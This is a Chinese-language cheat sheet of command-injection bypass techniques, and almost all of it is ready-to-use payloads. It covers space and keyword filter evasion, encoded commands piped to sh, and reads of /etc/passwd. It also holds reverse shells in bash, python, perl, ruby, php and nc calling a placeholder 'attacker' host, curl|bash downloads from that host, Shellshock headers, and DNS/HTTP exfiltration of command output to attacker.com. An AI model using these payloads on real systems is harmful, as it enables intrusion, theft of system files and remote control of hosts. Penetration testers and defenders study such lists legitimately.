# 命令注入绕过技术

## 空格绕过

### IFS 变量

```bash
# 使用 $IFS
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# 设置 IFS
IFS=,;`cat<<<user,password`

# 使用 {,}
{cat,/etc/passwd}
{ls,-la}
{id,}
```

### 重定向

```bash
# 使用 < 和 >
cat</etc/passwd
cat<>/etc/passwd

# 使用 here document
cat<<EOF
/etc/passwd
EOF
```

### Tab 和换行

```bash
# 使用 Tab (%09)
cat%09/etc/passwd

# 使用换行 (%0a)
cat%0a/etc/passwd
```

## 关键词绕过

### 变量拼接

```bash
# 分割关键词
c=at;a=/etc/passwd;$c $a
c=a;t=cat;$c$t /etc/passwd
u=who;v=ami;$u$v

# 环境变量
$PATH           # /usr/local/bin:/usr/bin:/bin
${PATH:0:1}     # /
${PATH:1:1}     # u
```

### 引号绕过

```bash
# 单引号
c'a't /etc/passwd
w'h'o'a'm'i

# 双引号
c"a"t /etc/passwd
w"h"o"a"m"i

# 反引号
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`

# 混合
ca''t /etc/pa''sswd
ca""t /etc/pa""sswd
```

### 反斜杠绕过

```bash
c\at /etc/passwd
wh\oam\i
\/\e\t\c\/\p\a\s\s\w\d
```

### 通配符

```bash
# 使用 ?
/???/??t /???/p??s?d
/???/w?oami

# 使用 *
/*/cat /*/passwd
/*/who*mi

# 使用 []
/bin/c[a]t /etc/p[a]sswd
/bin/c[a-t]t /etc/passwd

# 使用 [!]
/bin/[!a-z]at /etc/passwd
```

## 编码绕过

### Base64

```bash
# Base64 编码命令
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 动态解码
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
```

### Hex

```bash
# 十六进制编码
echo "636174202f6574632f706173737764" | xxd -r -p | sh

# 使用 printf
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# 使用 $'\x'
$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
```

### Octal

```bash
# 八进制编码
$(printf "\143\141\164\40\057\145\164\143\057\160\141\163\163\167\144")

# 使用 $''
$'\143\141\164\40\057\145\164\143\057\160\141\163\163\167\144'
```

### Unicode

```bash
# Unicode 编码 (在某些 shell 中)
$'\u0063\u0061\u0074' /etc/passwd
```

## 替代命令

### 文件读取替代

```bash
# cat 替代
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
tac /etc/passwd
nl /etc/passwd
od -c /etc/passwd
xxd /etc/passwd
base64 /etc/passwd
strings /etc/passwd
rev /etc/passwd | rev
sort /etc/passwd
uniq /etc/passwd
diff /etc/passwd /dev/null

# 使用 dd
dd if=/etc/passwd

# 使用 paste
paste /etc/passwd

# 使用 grep
grep '' /etc/passwd
grep -z '' /etc/passwd
```

### 执行命令替代

```bash
# 替代分号 (;)
| id
|| id
& id
&& id
`id`
$(id)
\nid
%0aid

# 替代管道
`id`
xargs id
exec id
```

### 反弹 Shell 替代

```bash
# bash
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

# python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# perl
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# ruby
ruby -rsocket -e'f=TCPSocket.open("attacker",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# php
php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# nc
nc -e /bin/sh attacker 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f

# curl + bash
curl http://attacker/shell.sh|bash
wget http://attacker/shell.sh -O-|bash
```

## 长度限制绕过

### 文件写入

```bash
# 分段写入
echo -n "cat /e">a
echo -n "tc/pas">>a
echo -n "swd">>a
sh a

# 使用 >> 追加
echo 'cat /e' > a
echo 'tc/pass' >> a
echo 'wd' >> a
sh a
```

### 使用时间

```bash
# sleep 控制执行顺序
sleep 1;cat /etc/passwd
sleep 2;id
```

### 使用变量

```bash
# 逐步构建命令
a=c;b=a;c=t;$a$b$c /etc/passwd
a=c;b=a;c=t;d=/;e=etc;f=p;g=a;h=s;s=s;w=w;i=d;$a$b$c $d$e$d$f$g$s$w$d$i
```

## HTTP 绕过

### HTTP 参数

```
# HPP
cmd=id&cmd=;cat /etc/passwd

# 数组参数
cmd[]=id;cat /etc/passwd

# JSON 注入
{"cmd":"test\";id;\""}
```

### Header 注入

```
User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'
Referer: () { :; }; /bin/bash -c 'cat /etc/passwd'
Cookie: () { :; }; /bin/bash -c 'cat /etc/passwd'
```

## 特定场景绕过

### PHP 绕过

```php
# escapeshellarg 绕过
# 使用特殊字符
ls -lh 'foo'\''bar'  # 输入: foo'bar

# escapeshellcmd 绕过
# 使用换行
echo "test\ntest2"
```

### Python 绕过

```python
# subprocess 绕过
subprocess.call("id", shell=True)  # 危险用法

# 绕过黑名单
__import__('os').system('id')
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### Java 绕过

```java
// Runtime.exec 绕过
Runtime.getRuntime().exec(new String[]{"bash", "-c", "cat /etc/passwd"});

// ProcessBuilder
new ProcessBuilder("bash", "-c", "cat /etc/passwd").start();
```

### Node.js 绕过

```javascript
// child_process 绕过
require('child_process').exec('id')
require('child_process').spawn('id', [], {shell: true})
require('child_process').execSync('id')

// 使用反引号
`id`
global.process.mainModule.require('child_process').exec('id')
```

## 检测技巧

### 带外检测

```bash
# DNS 外带
nslookup $(whoami).attacker.com
dig $(id | base64).attacker.com

# HTTP 外带
curl http://attacker.com/?d=$(id | base64)
wget http://attacker.com/?d=$(id | base64)
```

### 时间检测

```bash
# 简单延时
sleep 5

# 条件延时
`sleep 5`
$(sleep 5)
| sleep 5
; sleep 5
```